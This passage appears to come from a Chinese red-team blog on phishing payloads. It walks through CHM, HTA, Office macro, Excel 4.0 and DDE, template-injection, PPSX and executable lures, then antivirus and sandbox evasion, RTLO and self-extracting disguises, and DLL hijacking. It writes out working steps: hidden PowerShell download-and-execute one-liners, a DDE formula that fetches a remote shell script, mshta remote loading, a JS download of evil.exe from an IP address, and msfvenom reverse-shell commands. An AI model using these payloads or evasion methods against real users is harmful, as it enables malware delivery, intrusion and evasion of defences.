+<h3 id="CHM文档bypass-waf"><a href="#CHM文档bypass-waf" class="headerlink" title="CHM文档bypass waf"></a>CHM文档bypass waf</h3><p>（1）利用powershell无参运行，但是要把powershell脚本打包编译成chm，然后利用自带hh.exe 。hh.exe具有decompile(反编译，将chm返回成html，其实就类似chm可以比喻成一个压缩包，decompile是解压缩)的功能，可以将打包进chm的文件释放出来。</p>
+<p>HH.EXE -decompile C:\Windows\Temp .&#x2F;XMLconvert.chm</p>
+<p>（2） CHM本身支持js（jscript）语法，可以利用c#写个弹shell的，然后利用利用DotNetToJScript转js，然后在把js混淆加密进行打包免杀，利用cscript或者wscript来执行js。类似的还有执行hta文件等等。</p>
+<h3 id="4）HTA钓鱼"><a href="#4）HTA钓鱼" class="headerlink" title="4）HTA钓鱼"></a>4）HTA钓鱼</h3><p>HTA 是 HTML Application 的缩写，直接将 HTML 保存成 HTA 的格式，是一个独立的应用软件。HTA虽然用HTML、JS和CSS编写，缺比普通网页权限大得多，它具有桌面程序的所有权限。就是一个 html 应用程序，双击就可以运行</p>
+<p>正常是msf生成的hta文件弹shell，假设目标存在命令执行的漏洞，那么咱们在目标上执行如下即可返回msf的shell</p>
+<p>mshta <a href="http://127.0.0.1:8080/xxx.hta">http://127.0.0.1:8080/xxx.hta</a></p>
+<p>远程调用一般会被杀，最好本地运行</p>
+<p>利用github开源项目可以绕过部分waf</p>
+<p><a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006259.jpeg" alt="图片"></p>
+<h3 id="5）宏钓鱼"><a href="#5）宏钓鱼" class="headerlink" title="5）宏钓鱼"></a>5）宏钓鱼</h3><p>正常操作是利用cs生成宏代码，复制到vb里面去</p>
+<p>然后显示的是宏被禁用，为了增强迷惑性，可以进行编辑一下</p>
+<p>首先在word选项中开启开发工具</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006260.jpeg" alt="图片"></p>
+<p>然后把宏打开</p>
+<p>创建一个 test.doc</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006261.jpeg" alt="图片"></p>
+<p>然后点击 Visual Basic</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006262.jpeg" alt="图片"></p>
+<p>使用Cobalt Strike 生成木马</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006263.jpeg" alt="图片"></p>
+<p>点击添加一个监听端口，注意：如果端口在防火墙上策略有误，则会导致反弹失败</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006264.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006365.jpeg" alt="图片"></p>
+<p>将代码粘贴到刚才打开的地方</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006366.jpeg" alt="图片"></p>
+<p>然后保存即可</p>
+<p>doc格式和其它启用宏的模板的格式都可以</p>
+<p>doc格式和原来格式的图标一样</p>
+<p>运行文件，发现cs上线</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006367.jpeg" alt="图片"></p>
+<p>可以使用EvilClippy进行免杀</p>
+<p><a href="https://github.com/outflanknl/EvilClippy">https://github.com/outflanknl/EvilClippy</a></p>
+<p>使用一个正常的vba文件和恶意文件来进行混淆，来躲避杀软检测</p>
+<p>Excel文件也可以进行钓鱼</p>
+<p>新建一个Excel，在左下角的sheet处右键单击，选择插入：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006368.jpeg" alt="图片"></p>
+<p>在弹出的对话框中选择 MS Excel 4.0 宏表，点击确定</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006369.jpeg" alt="图片"></p>
+<p>完成之后左下角多了一栏 宏</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006370.jpeg" alt="图片"></p>
+<p>分别在A1和A2输入</p>
+<p>&#x3D;exec(“c:\windows\system32\cmd.exe”)</p>
+<p>&#x3D;halt()</p>
+<p>并将A1改为Auto_Open，修改完回车，这样就可以一打开文件就加载指令最后保存为xlsm后缀的文件</p>
+<p>这里的exec其实是执行的cmd命令，我们可以借此来上线CS等操作</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006371.jpeg" alt="图片"></p>
+<h3 id="宏钓鱼-bypass-waf"><a href="#宏钓鱼-bypass-waf" class="headerlink" title="宏钓鱼 bypass waf"></a>宏钓鱼 bypass waf</h3><p>（1）使用远程加载XSL文件达到免杀</p>
+<p><a href="https://github.com/sevagas/macro_pack">https://github.com/sevagas/macro_pack</a></p>
+<p><a href="https://github.com/mdsecactivebreach/SharpShooter">https://github.com/mdsecactivebreach/SharpShooter</a></p>
+<p>（2）高级VBA宏免杀</p>
+<p>参考 <a href="https://www.certego.net/en/news/advanced-vba-macros/">https://www.certego.net/en/news/advanced-vba-macros/</a></p>
+<h3 id="6）OLE（Object-Linking-and-Embedding，对象链接与嵌入）"><a href="#6）OLE（Object-Linking-and-Embedding，对象链接与嵌入）" class="headerlink" title="6）OLE（Object Linking and Embedding，对象链接与嵌入）"></a>6）OLE（Object Linking and Embedding，对象链接与嵌入）</h3><p>是一种把一个文件嵌入到另一个文件中的技术</p>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http lhost&#x3D;ip lport&#x3D;port -f vbs -o payload.vbs</p>
+<p>在开源的 openoffice 中可以直接只有DDE函数，像 &#x3D;DDE(“cmd”;”&#x2F;C calc”;”123”) 这样调用。而在正规的office套件中则移除了DDE函数，但是我们还是可以使用application|topic!item这一格式的三元表达式调用DDe。</p>
+<p>注意：该方法的提示窗口只提示 application 而不提示 topic</p>
+<p>excel：（如果前缀是”&#x3D;”、”+” 或 “-“，则将其余部分视为表达式）</p>
+<p>&#x3D;cmd|’&#x2F;c powershell.exe -w hidden $e&#x3D;(New-Object System.Net.WebClient).DownloadString(“<a href="http://xxxx/getshell.ps1&quot;);IEX">http://XXXX/getshell.ps1&quot;);IEX</a> $e’!_xlbgnm.A1</p>
+<p>word：</p>
+<p>打开一个新的word文档，按下键盘的组合键 CTRL + F9 ，在文档中出现”{}”之后，将下面的这段代码复制到两个大括号之间</p>
+<p>{ DDEAUTO c:\windows\system32\cmd.exe “&#x2F;k calc.exe” }</p>
+<p>msf中可直接用，生成一个rtf文档，点击即可上线</p>
+<p>use exploit&#x2F;windows&#x2F;fileformat&#x2F;office_dde_delivery</p>
+<p>set lport 4444</p>
+<p>set lhost xx.xx.xx.xx</p>
+<h3 id="7）嵌入JS元素"><a href="#7）嵌入JS元素" class="headerlink" title="7）嵌入JS元素"></a>7）嵌入JS元素</h3><p>这个方式的原理是，如果我们往word中插进联机视频，那么再word的压缩包 word&#x2F;document.xml里的embeddedHtml项中会出现联机视频对应的内嵌html代码，我们可以通过修改这些代码，插入恶意js代码。</p>
+<p>一般的利用方式是通过js下载恶意文件，但是似乎是因为word的一些保护机制，不能实现页面跳转或者自动点击下载等操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var a = document.createElement(&#x27;a&#x27;);</span><br><span class="line">console.log(a);</span><br><span class="line">document.body.appendChild(a);</span><br><span class="line">a.style = &#x27;display: none&#x27;;</span><br><span class="line">a.href = &quot;http://149.129.64.180/evil.exe&quot;;  //该行若存在，打开word文件会报错</span><br><span class="line">a.download = fileName;</span><br><span class="line">window.URL.revokeObjectURL(url);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">a.click();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="8）利用模板文件注入宏指令"><a href="#8）利用模板文件注入宏指令" class="headerlink" title="8）利用模板文件注入宏指令"></a>8）利用模板文件注入宏指令</h3><p>原理是，先创建一个带模板的文档，再创一个启用宏的模板文件。然后在带模板的文档的压缩包里面修改一些内容，使其指向的模板修改为我们自己创建的模板文件，这之间的过程可以由smb协议完成，故过查杀几率较高。</p>
+<p>我们在启用宏的模板文件（doc3.dotm)里写入宏。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">Shell &quot;calc&quot;</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006472.jpeg" alt="图片"></p>
+<h3 id="9）CVE"><a href="#9）CVE" class="headerlink" title="9）CVE"></a>9）CVE</h3><p>Office历史上出现的可导致远程命令执行的漏洞有很多、如：CVE-2017-0199、CVE-2017-8570、CVE-2017-8759、CVE-2017-11882、CVE-2018-0802 等</p>
+<p>CVE-2017-0199</p>
+<p><a href="https://github.com/bhdresh/CVE-2017-0199">https://github.com/bhdresh/CVE-2017-0199</a></p>
+<p>影响版本：office 2016、2013、2010、2007</p>
+<p>CVE-2017-11882</p>
+<blockquote>
+<p><a href="https://github.com/Ridter/CVE-2017-11882/">https://github.com/Ridter/CVE-2017-11882/</a></p>
+</blockquote>
+<p>影响版本：office 2016、2013、2010、2007、2003</p>
+<p>CVE-2018-0802</p>
+<blockquote>
+<p><a href="https://github.com/rxwx/CVE-2018-0802">https://github.com/rxwx/CVE-2018-0802</a></p>
+</blockquote>
+<p>影响版本：office 2016、2013 Server Pack1、2010 Server Pack2、2007 Server Pack3</p>
+<h2 id="2、伪造界面钓鱼"><a href="#2、伪造界面钓鱼" class="headerlink" title="2、伪造界面钓鱼"></a>2、伪造界面钓鱼</h2><h3 id="1）PPT动作按钮特性构造-PPSX-钓鱼"><a href="#1）PPT动作按钮特性构造-PPSX-钓鱼" class="headerlink" title="1）PPT动作按钮特性构造 PPSX 钓鱼"></a>1）PPT动作按钮特性构造 PPSX 钓鱼</h3><p>运行程序比如可以选用cs powershell 的代码。选择ppsx进行保存</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>然后弹出的窗口处</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006473.jpeg" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:80/a&#x27;))&quot;</span><br><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass &quot;IEX (New-Object System.Net.WebClient).DownloadFile(&#x27;http:&#x27;+[char] 0x2F+[char] 0x2F+&#x27;cccn.nl&#x27;+[char] 0x2F+&#x27;c.php&#x27;,\&quot;$env:temp\ii.jse\&quot;); Invoke-Item \&quot;$env:temp\ii.jse\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后将格式保存为ppsx格式保存即可 执行即可上线</p>
+<h2 id="3、exe等可执行文件"><a href="#3、exe等可执行文件" class="headerlink" title="3、exe等可执行文件"></a>3、exe等可执行文件</h2><h3 id="1）shellcode-异或加密免杀（golang）"><a href="#1）shellcode-异或加密免杀（golang）" class="headerlink" title="1）shellcode 异或加密免杀（golang）"></a>1）shellcode 异或加密免杀（golang）</h3><p>利用 msfvenom 生成一段 shellcode</p>
+<p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -f num LHOST&#x3D;192.168.141.136 LPORT&#x3D;1234</p>
+<p>利用 golang ，将shellcode进行异或</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006474.jpeg" alt="图片"></p>
+<p>进行编译（在windows进行编译）</p>
+<p>go build xxx.go运行即可</p>
+<p>也可以利用aes加密等等</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<h3 id="2）shellcode转换免杀"><a href="#2）shellcode转换免杀" class="headerlink" title="2）shellcode转换免杀"></a>2）shellcode转换免杀</h3><p>C#编译成exe -&gt; exe -&gt; 转js -&gt; js混淆</p>
+<p>参考文章： <a href="https://wtfsec.org/posts/%E5%85%8D%E6%9D%80-msf-windows-payload-%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E8%B7%B5/">https://wtfsec.org/posts/%E5%85%8D%E6%9D%80-msf-windows-payload-%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E8%B7%B5/</a></p>
+<p>利用DotNetToJScript转exe为js</p>
+<blockquote>
+<p><a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a></p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<h3 id="3）shellcode编译免杀"><a href="#3）shellcode编译免杀" class="headerlink" title="3）shellcode编译免杀"></a>3）shellcode编译免杀</h3><p>使用msf生成一个PHP马（也可以其他语言的，比如perl啥的）</p>
+<p>msfvenom -a x86 –platform Windows -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;<Your IP Address>LPORT&#x3D;<Your Port to Connect On>-f raw &gt; shell.php</p>
+<p>利用bamcompile将php转为exe</p>
+<p>bamcompile -w -c shell.php shell.exe</p>
+<h3 id="4）shellcode分离加载免杀"><a href="#4）shellcode分离加载免杀" class="headerlink" title="4）shellcode分离加载免杀"></a>4）shellcode分离加载免杀</h3><p>分离一般分2种，一个是远程加载shellcode，另外是通过运行程序的时候将加密数据传入</p>
+<p>远程加载可以利用socket创建套接字或者直接http请求远程地址，钓鱼的时候可以将shellcode放在使用说明啥的</p>
+<p>shellcode loader github开源项目很多</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006475.jpeg" alt="图片"></p>
+<h3 id="5）绕过沙盒"><a href="#5）绕过沙盒" class="headerlink" title="5）绕过沙盒"></a>5）绕过沙盒</h3><p>主要思想：判断父进程是否为Debugger：在沙盒内被调试</p>
+<p>判断时间是否被加速：一般沙盒内的程序时间都会加速</p>
+<p>判断系统盘是否大于50GB：一个正常的PC的系统盘都会大于50GB</p>
+<p>虚拟机其他特征</p>
+<blockquote>
+<p><a href="https://github.com/dycsy/ShellcodeLoader">https://github.com/dycsy/ShellcodeLoader</a></p>
+<p><a href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a></p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006476.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<h3 id="6）exe伪装"><a href="#6）exe伪装" class="headerlink" title="6）exe伪装"></a>6）exe伪装</h3><p>1、图标伪装</p>
+<p>这里使用 Restorator 2018 小工具进行图标修改</p>
+<blockquote>
+<p><a href="http://www.pc6.com/softview/SoftView_585736.html">http://www.pc6.com/softview/SoftView_585736.html</a></p>
+</blockquote>
+<p>激活将附带的激活码填入即可</p>
+<p>然后使用 Restorator 修改图标</p>
+<p>直接点击exe文件拖入即可，如果没有图标文本的话，可以在电脑找一个exe格式的图标拖入，然后显示图标后复制过来即可</p>
+<p>图标的话需要ico格式</p>
+<p><a href="https://www.easyicon.net/iconsearch/%E2%BE%B3%E4%B9%90ico/">https://www.easyicon.net/iconsearch/⾳乐ico/</a></p>
+<p><a href="http://www.bitbug.net/%E5%9C%A8%E7%BA%BF%E5%88%B6%E4%BD%9Cico%E5%9B%BE%E6%A0%87">http://www.bitbug.net/在线制作ico图标</a></p>
+<p>在这⾥下载图标，并在bitbug转换格式即可！</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006577.jpeg" alt="图片"></p>
+<p>更改图标直接再图标处右键导入</p>
+<p>2、RTLO</p>
+<p>通过重命名，在a后面右键，插入Unicode控制字符 -&gt; RLO</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006578.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006579.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006580.jpeg" alt="图片"></p>
+<p>实测钓鱼方式有些古老，不管是不是病毒只要使用此方式伪装，360都会查杀</p>
+<p>3、rar解压自运行</p>
+<p>木马文件：artifact.exe 迷惑文件：calc.exe</p>
+<p>进入winrar，选中这两个文件，右键添加至压缩包，创建自解压格式压缩文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>高级 -&gt; 自解压选项 -&gt; 设置</p>
+<p>提取前打开伪装文件，提取后运行马</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>模式 -&gt; 全部隐藏</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006581.jpeg" alt="图片"></p>
+<p>更新 -&gt; 解压并更新文件，覆盖所有文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006582.jpeg" alt="图片"></p>
+<p>双击可以打开计算机，CS上线</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006583.jpeg" alt="图片"></p>
+<h3 id="7）绕过行为检测"><a href="#7）绕过行为检测" class="headerlink" title="7）绕过行为检测"></a>7）绕过行为检测</h3><p>部分敏感行为可操作windowsAPI</p>
+<p>比如360对添加用户会拦截</p>
+<p>可以操作以下两个API绕过</p>
+<p>NetUserAdd</p>
+<p>NetLocalGroupAddMembers</p>
+<p>其他的免杀还有内存（一般可用壳，但大多基本壳都在waf的特征库中）、花指令等等</p>
+<h3 id="8）DLL劫持-重新制作安装包"><a href="#8）DLL劫持-重新制作安装包" class="headerlink" title="8）DLL劫持+重新制作安装包"></a>8）DLL劫持+重新制作安装包</h3><p>DLL劫持指的是病毒通过一些手段来劫持或者替换正常的DLL，欺骗正常程序预先准备好的恶意DLL</p>
+<p>如下面图片中的，LPK.dll是应用程序运行所需要加载的DLL，该系统文件默认在C:\Winodws\system32路径下，但由于windows优先搜索当前路径，所以当我们把恶意LPK.dll放在应用程序同一路径下，便会被程序成功加载，从而执行恶意操作</p>
